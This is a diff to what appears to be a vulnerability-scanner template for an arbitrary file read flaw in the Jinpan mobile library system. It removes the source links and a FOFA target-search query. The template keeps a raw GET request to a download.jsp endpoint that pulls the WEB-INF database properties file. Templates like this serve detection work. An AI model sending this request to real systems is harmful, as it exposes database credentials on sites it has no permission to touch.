@@ -3,12 +3,8 @@ info:
   name: 金盘移动图书馆系统 前台任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/syd73cqwftkf4ky0'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: syd73cqwftkf4ky0
-    fofa: app="金盘软件-金盘移动图书馆系统"
 http:
 - raw:
   - 'GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
